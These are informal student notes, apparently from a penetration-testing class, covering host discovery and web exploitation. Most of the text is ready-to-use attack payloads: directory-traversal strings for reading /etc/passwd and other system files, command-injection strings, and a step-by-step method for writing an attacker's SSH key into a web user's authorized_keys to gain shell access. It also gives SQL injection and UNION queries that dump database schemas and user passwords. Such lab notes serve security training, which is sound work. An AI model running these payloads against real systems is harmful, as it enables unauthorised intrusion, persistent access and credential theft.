### Host Discovery
- Narrow the scope 
  - ping sweep (see whats out there maybe cuz huge subnet)
    - `for i in {1..254} ;do (ping -c x.x.x.x | grep "bytes from" &) ;done`
  - now can enumerate the hosts, nmap
    - nmap the well-known ports, notice some important services
      - say it's http, you can use those scripts, some examples below:
      - `nmap -v -sT -Pn -T4 --script http-robots.txt.nse X.X.X.X`
      - `nmap -v -sT -Pn -T4 --script http-enum.nse X.X.X.X`
        - may need `=` connecting "--script" with "http-blahblah"
      - `nikto -h X.X.X.X`
- use web exploitation tools (view source, sql, inspect element, etc) ***HE SAID SOMETHING ABOUT CHANGING OPACITY, CODE COULD BE BLACK AND/OR WHITE IN PAGE SRC OR CONSOLE THAT WOULD'T NORMALLY BE VISIBLE***

### Web Exploitation
- Directory Traversal - information
  - ../../../../../../../../etc/passwd
  - ../../../../../../../../etc/group
  - ../../../../../../../../etc/hosts
  - ../../../../../../../../etc/networks
  - ../../../../../../../../etc/resolv.conf
- Cmd Injection - Information/Access
  - `; id`
  - `; whoami`
  - `; cat`
  - `; <CMD>`
- want to upload your SSH key to user that you are home directory
  - find the default home directoru, for the user, based off of /etc/passwd
    - `www-data:x:33:33:www-data:/var/www:/bin/bash` 
  - generate your own ssh keys 
    - `@linops: ssh-keygen -t rsa -b 4096` 
      - set no password
      - saves public key in /home/student/.ssh/id_rsa.pub
        - **dont use privat key dumbass**
      - `cat /home/student/.ssh/id_rsa.pub
      - copy the text and save it to put it on the vulnerable web stuff
  - utilizing command injection,
  - `; ls -la /var/www` to see what's there
    - if /.ssh directory is not there, create it
    - `; mkdir var/www//.ssh`
  - `; touch /var/www/.ssh/authorized_keys`
  - `; ls -la /var/www/.ssh` - **ALWAYS CHECK TO MAKE SURE THE THINGS YOU DID ACTUALLY HAPPENED**
  - `; echo "(id_rsa.pub conents)" >> /var/www/.ssh/authorized_keys`
  - `ssh -i .ssh/id_rsa www-data@X.X.X.X`
    - www-data being the user that you are when you're on the webpage
- Good walkthrough for all this on **Web Exploitation Day 1** 
- POST method = input field box 
  - `test' or 1='1`
  - `test' or 1='1;`
  - `test' or 1='1; #`
  - `test' or 1='1; --`
   - Can also try `OR` instead of `or` cuz shit is finnickyfuct
  - throw it in both fields
  - see if it breaks?
- GET method = url thing
  - information may be different thatn POST method
  - can keep interacting with the page to see how the url changes
  - blahblahblah.php?Selection=**1**&submitblahblah
    - see that 1 changes to 2 or 3 and stuff 
      - .php?Selection=1 or 1=1
        - %20 represents a space in a URL field
      - .php?Selection=2 or 1=1
        - and 3 and 4 and so on
          - different syntaxes `=2 or 1= 1;` `=2 or 1=1; #` and stuff same shit as POST method
  - GOLDEN STATEMENT
    - on vulnerable page, 
      - Selection=2 UNION select table_schema,table_name,column_name from information.schema.columns 
      - columns = Table, This table exists within the information_schema database
      - table_schema = Column, List out database names 
      - Column_name = Column, List out the column names
        - see that there's a column name thing called session, with column names (middle column) from user table (right)
        - UNION select 1,2,3,4,5,6 #
        - UNION select 1,2,3 #
          - let's say 2 showed 4 showed and 6 showed
          - UNION select 1,table_schema,3,table_name,5,column_name from information_schema.columns
            - put the things we wanted in their respective fields and filled in the rest with placeholder numbers
        - UNION select id,name,pass from session.user
















